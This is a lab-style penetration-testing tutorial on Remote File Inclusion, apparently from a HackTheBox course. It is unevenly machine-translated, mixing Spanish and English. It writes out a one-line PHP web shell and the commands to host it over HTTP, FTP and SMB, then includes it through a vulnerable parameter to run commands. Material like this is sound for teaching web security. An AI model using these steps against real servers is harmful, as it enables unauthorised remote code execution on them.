# Remote File Inclusion (RFI)

Hasta ahora en este módulo, nos hemos centrado principalmente en`Local File Inclusion (LFI)`. Sin embargo, en algunos casos, también podemos incluir archivos remotos "[Inclusión de archivos remotos (RFI)](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.2-Testing_for_Remote_File_Inclusion)", si la función vulnerable permite la inclusión de URL remotas. Esto permite dos beneficios principales:

1. Enumerando puertos y aplicaciones web solo locales (es decir, SSRF)
2. Obtener la ejecución de código remoto al incluir un script malicioso que alojamos

En esta sección, cubriremos cómo obtener la ejecución del código remoto a través de las vulnerabilidades de RFI. El[Ataques del lado del servidor](https://academy.hackthebox.com/module/details/145)módulo cubre varios`SSRF`Técnicas, que también pueden usarse con vulnerabilidades de RFI.

# **Inclusión local vs. de archivos remoto**

Cuando una función vulnerable nos permite incluir archivos remotos, podemos alojar un script malicioso y luego incluirlo en la página vulnerable para ejecutar funciones maliciosas y obtener la ejecución de código remoto. Si nos referimos a la tabla en la primera sección, vemos que las siguientes son algunas de las funciones que (si son vulnerables) permitirían RFI:

| **Función** | **Leer contenido** | **Ejecutar** | **URL remota** |
| --- | --- | --- | --- |
| **Php** |  |  |  |
| `include()`/`include_once()` | ✅ | ✅ | ✅ |
| `file_get_contents()` | ✅ | ❌ | ✅ |
| **Java** |  |  |  |
| `import` | ✅ | ✅ | ✅ |
| **.NETO** |  |  |  |
| `@Html.RemotePartial()` | ✅ | ❌ | ✅ |
| `include` | ✅ | ✅ | ✅ |

Como podemos ver, casi cualquier vulnerabilidad de RFI también es una vulnerabilidad de LFI, ya que cualquier función que permita las URL remotas generalmente también permite, incluidas las locales. Sin embargo, un LFI puede no ser necesariamente un RFI. Esto se debe principalmente a tres razones:

1. La función vulnerable puede no permitir que incluyan URL remotas
2. Solo puede controlar una parte del nombre de archivo y no todo el envoltorio de protocolo (por ejemplo:`http://`, `ftp://`, `https://`).
3. La configuración puede evitar RFI por completo, ya que la mayoría de los servidores web modernos se deshabilitan, incluidos los archivos remotos de forma predeterminada.

Además, como podemos tener en cuenta en la tabla anterior, algunas funciones permiten que incluyan URL remotas pero no permiten la ejecución del código. En este caso, aún podríamos explotar la vulnerabilidad para enumerar los puertos locales y las aplicaciones web a través de SSRF.

# **Verificar RFI**

En la mayoría de los idiomas, incluidas las URL remotas se considera una práctica peligrosa, ya que puede permitir tales vulnerabilidades. Esta es la razón por la cual la inclusión remota de URL generalmente se deshabilita de forma predeterminada. Por ejemplo, cualquier inclusión de URL remota en PHP requeriría el`allow_url_include`configuración para estar habilitado. Podemos verificar si esta configuración está habilitada a través de LFI, como lo hicimos en la sección anterior:

Inclusión de archivos remotos (RFI)

```
xnoxos@htb[/htb]$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_includeallow_url_include = On

```

However, this may not always be reliable, as even if this setting is enabled, the vulnerable function may not allow remote URL inclusion to begin with. So, a more reliable way to determine whether an LFI vulnerability is also vulnerable to RFI is to `try and include a URL`y ver si podemos obtener su contenido. En primer lugar,`we should always start by trying to include a local URL`Para garantizar que nuestro intento no sea bloqueado por un firewall u otras medidas de seguridad. Entonces, usemos (`http://127.0.0.1:80/index.php`) como nuestra cadena de entrada y vea si se incluye:

![](https://academy.hackthebox.com/storage/modules/23/lfi_local_url_include.jpg)

As we can see, the `index.php` page got included in the vulnerable section (i.e. History Description), so the page is indeed vulnerable to RFI, as we are able to include URLs. Furthermore, the `index.php` page did not get included as source code text but got executed and rendered as PHP, so the vulnerable function also allows PHP execution, which may allow us to execute code if we include a malicious PHP script that we host on our machine.

We also see that we were able to specify port `80` and get the web application on that port. If the back-end server hosted any other local web applications (e.g. port `8080`), then we may be able to access them through the RFI vulnerability by applying SSRF techniques on it.

**Note:** It may not be ideal to include the vulnerable page itself (i.e. index.php), as this may cause a recursive inclusion loop and cause a DoS to the back-end server.

# **Remote Code Execution with RFI**

The first step in gaining remote code execution is creating a malicious script in the language of the web application, PHP in this case. We can use a custom web shell we download from the internet, use a reverse shell script, or write our own basic web shell as we did in the previous section, which is what we will do in this case:

Inclusión de archivos remotos (RFI)

```
xnoxos@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

Ahora, todo lo que necesitamos hacer es alojar este script e incluirlo a través de la vulnerabilidad de RFI. Es una buena idea escuchar en un puerto HTTP común como`80`o`443`, ya que estos puertos pueden ser blancos en caso de que la aplicación web vulnerable tenga un firewall que impida las conexiones salientes. Además, podemos alojar el script a través de un servicio FTP o un servicio SMB, como veremos a continuación.

# **Http**

Ahora, podemos iniciar un servidor en nuestra máquina con un servidor Python básico con el siguiente comando, como sigue:

Inclusión de archivos remotos (RFI)

```
xnoxos@htb[/htb]$ sudo python3 -m http.server <LISTENING_PORT>
Serving HTTP on 0.0.0.0 port <LISTENING_PORT> (http://0.0.0.0:<LISTENING_PORT>/) ...

```

Ahora, podemos incluir nuestro caparazón local a través de RFI, como lo hicimos antes, pero usando`<OUR_IP>`y nuestro`<LISTENING_PORT>`. También especificaremos el comando que se ejecutará con`&cmd=id`:

![](https://academy.hackthebox.com/storage/modules/23/rfi_localhost.jpg)

Como podemos ver, obtuvimos una conexión en nuestro servidor Python, y se incluyó el shell remoto, y ejecutamos el comando especificado:

Inclusión de archivos remotos (RFI)

```
xnoxos@htb[/htb]$ sudo python3 -m http.server <LISTENING_PORT>
Serving HTTP on 0.0.0.0 port <LISTENING_PORT> (http://0.0.0.0:<LISTENING_PORT>/) ...

SERVER_IP - - [SNIP] "GET /shell.php HTTP/1.0" 200 -

```

**Consejo:**Podemos examinar la conexión en nuestra máquina para garantizar que la solicitud se envíe tal como la especificamos. Por ejemplo, si vimos una extensión adicional (.php) se agregó a la solicitud, entonces podemos omitirla de nuestra carga útil

# **Ftp**

Como se mencionó anteriormente, también podemos alojar nuestro script a través del protocolo FTP. Podemos iniciar un servidor FTP básico con Python's`pyftpdlib`, como sigue:

Inclusión de archivos remotos (RFI)

```
xnoxos@htb[/htb]$ sudo python -m pyftpdlib -p 21[SNIP] >>> starting FTP server on 0.0.0.0:21, pid=23686 <<<
[SNIP] concurrency model: async
[SNIP] masquerade (NAT) address: None
[SNIP] passive ports: None

```

Esto también puede ser útil en caso de que los puertos HTTP estén bloqueados por un firewall o el`http://`La cadena es bloqueada por un WAF. Para incluir nuestro script, podemos repetir lo que hicimos antes, pero usar el`ftp://`esquema en la URL, como sigue:

![](https://academy.hackthebox.com/storage/modules/23/rfi_localhost.jpg)

Como podemos ver, esto funcionó de manera muy similar a nuestro ataque HTTP, y el comando fue ejecutado. Por defecto, PHP intenta autenticarse como un usuario anónimo. Si el servidor requiere una autenticación válida, entonces las credenciales se pueden especificar en la URL, de la siguiente manera:

Inclusión de archivos remotos (RFI)

```
xnoxos@htb[/htb]$ curl 'http://<SERVER_IP>:<PORT>/index.php?language=ftp://user:pass@localhost/shell.php&cmd=id'...SNIP...
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

# **SMB**

If the vulnerable web application is hosted on a Windows server (which we can tell from the server version in the HTTP response headers), then we do not need the `allow_url_include` setting to be enabled for RFI exploitation, as we can utilize the SMB protocol for the remote file inclusion. This is because Windows treats files on remote SMB servers as normal files, which can be referenced directly with a UNC path.

We can spin up an SMB server using `Impacket's smbserver.py`, which allows anonymous authentication by default, as follows:

Remote File Inclusion (RFI)

```
xnoxos@htb[/htb]$ impacket-smbserver -smb2support share $(pwd)Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed

```

Now, we can include our script by using a UNC path (e.g. `\\<OUR_IP>\share\shell.php`), and specify the command with (`&cmd=whoami`) as we did earlier:

![](https://academy.hackthebox.com/storage/modules/23/windows_rfi.png)

As we can see, this attack works in including our remote script, and we do not need any non-default settings to be enabled. However, we must note that this technique is `more likely to work if we were on the same network`, as accessing remote SMB servers over the internet may be disabled by default, depending on the Windows server configurations.